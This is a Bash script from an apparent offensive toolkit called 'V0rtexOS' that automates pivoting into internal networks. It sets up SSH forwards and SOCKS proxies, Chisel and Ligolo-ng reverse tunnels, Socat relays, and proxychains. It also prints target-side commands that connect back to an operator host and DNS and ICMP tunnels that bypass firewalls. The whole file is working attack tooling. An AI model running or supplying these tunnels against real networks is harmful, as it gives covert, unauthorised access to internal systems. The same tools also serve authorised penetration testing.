#!/usr/bin/env bash
# V0rtexOS — Tunnel & Pivoting Setup
# Configura túneis para pivoting em redes internas
# Uso: tunnel-setup.sh <modo> [args]

set -euo pipefail
RED='\033[1;31m' GRN='\033[1;32m' CYN='\033[1;36m' YEL='\033[1;33m' RST='\033[0m'
ok()  { echo -e "${GRN}[+]${RST} $*"; }
log() { echo -e "${CYN}[*]${RST} $*"; }

# ── SSH Tunneling ─────────────────────────────────
ssh_local_forward() {
    # Acessar serviço interno via SSH
    local lport="$1" rhost="$2" rport="$3" ssh_host="$4" user="${5:-root}"
    log "SSH Local Forward: 127.0.0.1:$lport → $rhost:$rport via $ssh_host"
    ssh -N -L "${lport}:${rhost}:${rport}" "${user}@${ssh_host}" &
    ok "Túnel ativo. Acesse: localhost:$lport"
}

ssh_remote_forward() {
    # Expor serviço local para host remoto
    local rport="$1" lhost="$2" lport="$3" ssh_host="$4" user="${5:-root}"
    log "SSH Remote Forward: $ssh_host:$rport → $lhost:$lport"
    ssh -N -R "${rport}:${lhost}:${lport}" "${user}@${ssh_host}" &
    ok "Remote forward ativo"
}

ssh_socks_proxy() {
    local port="${1:-1080}" ssh_host="${2:?}" user="${3:-root}"
    log "SSH SOCKS5 Proxy na porta $port via $ssh_host"
    ssh -N -D "0.0.0.0:$port" "${user}@${ssh_host}" &
    ok "SOCKS5 em 0.0.0.0:$port"
    log "Configure proxychains: socks5 127.0.0.1 $port"
}

# ── Chisel ────────────────────────────────────────
chisel_server() {
    local port="${1:-8080}"
    log "Chisel Server na porta $port"
    chisel server --port "$port" --reverse --socks5 &
    ok "Chisel server rodando. No alvo: chisel client <LHOST>:$port R:socks"
}

chisel_client() {
    local server="${1:?}" port="${2:-8080}" socks_port="${3:-1080}"
    log "Chisel Client → $server:$port | SOCKS5 local: $socks_port"
    chisel client "${server}:${port}" "R:${socks_port}:socks" &
    ok "Túnel estabelecido. SOCKS5 em servidor:$socks_port"
}

# ── Ligolo-ng ─────────────────────────────────────
ligolo_proxy() {
    local port="${1:-11601}" socks="${2:-1080}"
    log "Ligolo-ng Proxy — porta $port"
    sudo ip tuntap add user root mode tun ligolo 2>/dev/null || true
    sudo ip link set ligolo up 2>/dev/null || true
    ligolo-proxy -selfcert -laddr "0.0.0.0:$port" &
    ok "Ligolo proxy ativo em $port"
    log "No alvo: ligolo-agent -connect <LHOST>:$port -ignore-cert"
    log "No console Ligolo: start --tun ligolo"
    log "Rota: sudo ip route add 192.168.X.0/24 dev ligolo"
}

# ── Socat ─────────────────────────────────────────
socat_forward() {
    local lport="$1" rhost="$2" rport="$3"
    log "Socat Forward: 0.0.0.0:$lport → $rhost:$rport"
    socat TCP-LISTEN:"$lport",fork,reuseaddr TCP:"$rhost":"$rport" &
    ok "Socat forward ativo"
}

socat_ssl_tunnel() {
    local lport="$1" rhost="$2" rport="$3"
    log "Socat SSL Tunnel: $lport → $rhost:$rport"
    # Gerar cert self-signed
    openssl req -newkey rsa:2048 -nodes -keyout /tmp/socat.key \
        -x509 -days 365 -out /tmp/socat.crt -subj "/CN=aeternus" &>/dev/null
    cat /tmp/socat.crt /tmp/socat.key > /tmp/socat.pem
    socat "OPENSSL-LISTEN:$lport,cert=/tmp/socat.pem,verify=0,fork" \
          "TCP:$rhost:$rport" &
    ok "Socat SSL tunnel ativo em $lport"
}

# ── Proxychains setup ─────────────────────────────
setup_proxychains() {
    local proxy_host="${1:-127.0.0.1}" proxy_port="${2:-1080}" \
          proxy_type="${3:-socks5}"
    cat > /etc/proxychains.conf <<EOF
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
localnet 127.0.0.0/255.0.0.0

[ProxyList]
$proxy_type $proxy_host $proxy_port
EOF
    ok "Proxychains configurado: $proxy_type $proxy_host:$proxy_port"
    log "Use: proxychains4 -q <command>"
}

# ── DNS over TCP tunnel ────────────────────────────
dns_tunnel() {
    local domain="${1:?Informe domínio controlado}"
    log "DNS Tunnel via $domain (requer NS delegado)"
    if command -v iodine &>/dev/null; then
        log "Server (no seu NS): sudo iodined -f -c -P senha 192.168.99.1 $domain"
        log "Cliente (no alvo) : sudo iodine -f -P senha <NS_IP> $domain"
    else
        log "Instale iodine: pacman -S iodine"
    fi
}

# ── ICMP tunnel ───────────────────────────────────
icmp_tunnel() {
    local remote="${1:?Informe IP remoto}"
    if command -v ptunnel &>/dev/null; then
        log "ICMP Tunnel para $remote"
        log "Server (alvo): sudo ptunnel"
        log "Client: sudo ptunnel -p $remote -lp 8000 -da 127.0.0.1 -dp 22"
        log "SSH via ICMP: ssh -p 8000 user@127.0.0.1"
    else
        log "Instale ptunnel: pacman -S ptunnel"
    fi
}

usage() {
    echo -e "\n${CYN}V0rtexOS — Tunnel & Pivoting${RST}"
    echo
    echo "Modos:"
    echo "  ssh-local  <lport> <rhost> <rport> <ssh_host> [user]"
    echo "  ssh-remote <rport> <lhost> <lport> <ssh_host> [user]"
    echo "  ssh-socks  [port] <ssh_host> [user]"
    echo "  chisel-srv [port]"
    echo "  chisel-cli <server> [port] [socks_port]"
    echo "  ligolo     [port]"
    echo "  socat      <lport> <rhost> <rport>"
    echo "  socat-ssl  <lport> <rhost> <rport>"
    echo "  proxychains [host] [port] [type]"
    echo "  dns-tunnel <domain>"
    echo "  icmp       <remote_ip>"
    echo
}

case "${1:-help}" in
    ssh-local)   shift; ssh_local_forward "$@" ;;
    ssh-remote)  shift; ssh_remote_forward "$@" ;;
    ssh-socks)   shift; ssh_socks_proxy "$@" ;;
    chisel-srv)  shift; chisel_server "$@" ;;
    chisel-cli)  shift; chisel_client "$@" ;;
    ligolo)      shift; ligolo_proxy "$@" ;;
    socat)       shift; socat_forward "$@" ;;
    socat-ssl)   shift; socat_ssl_tunnel "$@" ;;
    proxychains) shift; setup_proxychains "$@" ;;
    dns-tunnel)  shift; dns_tunnel "$@" ;;
    icmp)        shift; icmp_tunnel "$@" ;;
    *)           usage ;;
esac
